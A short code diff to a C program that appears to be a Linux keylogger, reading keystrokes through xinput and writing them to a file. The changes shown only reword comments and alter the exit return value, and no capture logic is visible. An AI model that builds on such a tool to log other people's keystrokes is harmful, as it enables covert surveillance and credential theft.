@@ -12,7 +12,7 @@
 FILE *fp1 = NULL; //process descriptor for xinput
 FILE *fp2 = NULL; //file descriptor to write keystrokes
 
-//Wrap up file desciptor and process descriptor
+//For Wrapping up descriptors when SIGINT is generated. 
 static void catchInt(int signo)
 {
   fclose(fp1);
@@ -26,7 +26,7 @@ int main(int argc, char *argv[])
   int key=0;
   char buffer[SIZE];
 
-  signal(SIGINT, catchInt); //waiting for the interruption and invokes catchInt
+  signal(SIGINT, catchInt); //Invokes catchInt function as soon as SIGINT is occured. 
 
   if(argc!=2)
     goto exit;
@@ -92,5 +92,5 @@ int main(int argc, char *argv[])
        }
   }
 
-  exit:return 0;
+  exit:return(EXIT_FAILURE);
 }
